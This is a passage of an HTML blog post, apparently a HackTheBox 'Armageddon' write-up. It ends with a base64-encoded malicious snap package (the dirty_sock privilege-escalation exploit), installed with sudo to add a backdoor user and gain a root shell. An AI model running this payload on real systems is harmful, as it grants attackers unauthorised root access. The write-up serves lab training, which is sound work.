XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw'''
               + 'A' * 4256 + '=='))"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee </span>poc.snap

<span class="nv">$ </span><span class="nb">sudo </span>snap <span class="nb">install </span>poc.snap
</pre></table></code></div></div><p>Run the code then do a check in <code class="language-plaintext highlighter-rouge">/etc/passwd</code> to see whether our exploit works.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-29.png" alt="" /></p><p>Switch to <code class="language-plaintext highlighter-rouge">dirty_sock</code> with <code class="language-plaintext highlighter-rouge">dirty_sock</code> as password then spawn our root shell and achieve the machine flag.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-30.png" alt="" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/en/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/en/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/blog/en/tags/network/" class="post-tag no-text-decoration" >network</a> <a href="/blog/en/tags/pwn/" class="post-tag no-text-decoration" >pwn</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Armageddon - Another infosec blog&url=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Armageddon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Armageddon - Another infosec blog&u=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Armageddon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Armageddon - Another infosec blog&url=https://legiahuyy.github.io/blog/en/blog/en/posts/HTB-Armageddon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/en/tags/pwn/">pwn</a> <a class="post-tag" href="/blog/en/tags/network/">network</a> <a class="post-tag" href="/blog/en/tags/kma/">kma</a> <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/blog/en/tags/web-pentest/">web pentest</a> <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a> <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/en/posts/HTB-Sharp/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --> <span class="timeago small" > May 16 <i class="unloaded">2021-05-16T02:45:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Sharp</h3><div class="text-muted small"><p> Hi, after a long time not posting anything on this blog because of my university workload. Letâ€™s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) mac...</p></div></div></a></div><div class="card"> <a href="/blog/en/posts/ez-bof/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 24 <i class="unloaded">2021-02-24T02:45:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>A simple BOF - KCSC</h3><div class="text-muted small"><p> Today we are going to test out Ghidra with one of my university pwnie challenge. Info Value Name pwn1 SHA256 d3e77076e7c9c113...</p></div></div></a></div><div class="card"> <a href="/blog/en/posts/RFI-Wrapper/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --> <span class="timeago small" > Feb 24 <i class="unloaded">2021-02-24T02:45:00+07:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>LFI/RFI Wrapper - KCSC</h3><div class="text-muted small"><p> This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my universityâ€™s initial challenges. The task is simple itself but I want to show you the mind...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/blog/en/posts/HTB-Sharp/" class="btn btn-outline-primary"><p>HackTheBox - Sharp</p></a> <span class="btn btn-outline-primary disabled"><p>-</p></span></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> Â© 2021 <a href="https://twitter.com/0x7c00">Le Gia Huy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Most rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://github.com" target="_blank">Github Pages</a></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/en/tags/pwn/">pwn</a> <a class="post-tag" href="/blog/en/tags/network/">network</a> <a class="post-tag" href="/blog/en/tags/kma/">kma</a> <a class="post-tag" href="/blog/en/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/blog/en/tags/web-pentest/">web pentest</a> <a class="post-tag" href="/blog/en/tags/thoughts/">thoughts</a> <a class="post-tag" href="/blog/en/tags/reverse-engineer/">reverse engineer</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy Â© 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/en/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://legiahuyy.github.io/blog/en{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
